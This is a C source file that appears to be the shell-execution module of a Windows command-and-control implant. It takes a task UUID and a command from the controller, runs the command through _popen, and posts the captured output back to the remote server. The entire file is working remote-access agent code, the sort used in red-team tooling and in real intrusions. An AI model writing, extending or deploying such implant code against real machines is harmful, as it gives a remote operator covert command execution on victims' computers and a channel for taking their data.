#include <windows.h>
#include <stdio.h>
#include "shell.h"
#include "../Command.h"
#include "../Utils.h"

BOOL executeShell(PParser arguments)
{
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) 
    {
        LOG("[-] executeShell: Failed to get UUID");
        return FALSE;
    }

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    if (!taskUuid) { LocalFree(uuidBytes); return FALSE; }
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    LOG("[*] Task UUID: %s", taskUuid);

    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;

    SIZE_T cmdLen = 0;
    PBYTE cmdBytes = ParserGetBytes(arguments, &cmdLen);
    
    if (!cmdBytes)
    {
        LOG("[-] executeShell: Failed to get CMD");
        LocalFree(taskUuid);
        return FALSE;
    }

    SIZE_T extendedSize = cmdLen + 6;
    PCHAR cmd = (PCHAR)LocalAlloc(LPTR, extendedSize);
    if (!cmd) { LocalFree(taskUuid); LocalFree(cmdBytes); return FALSE; }
    
    memcpy(cmd, cmdBytes, cmdLen);
    cmd[cmdLen] = '\0';
    strcat(cmd, " 2>&1");
    LocalFree(cmdBytes);

    LOG("[*] Command to run: %s", cmd);

    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    LOG("[*] invoking _popen...");
    FILE* fp = _popen(cmd, "rb");
    if (fp)
    {
        CHAR path[1035];
        while (fgets(path, sizeof(path), fp) != NULL)
        {
            PackageAddBytesRaw(output, (PBYTE)path, strlen(path));
        }
        _pclose(fp);
    }
    else
    {
        LOG("[-] _popen failed");
        CHAR* err = "Failed to run command";
        PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }
    
    LOG("[*] Output size: %d", output->length);
    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);

    LOG("[*] Sending POST_RESPONSE...");
    PParser ResponseParser = sendPackage(responseTask);
    
    if (ResponseParser)
    {
        LOG("[+] POST_RESPONSE succcess");
        ParserDestroy(ResponseParser);
    }
    else
    {
        LOG("[-] POST_RESPONSE failed");
    }
    
    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);
    LocalFree(cmd);

    return TRUE;
}
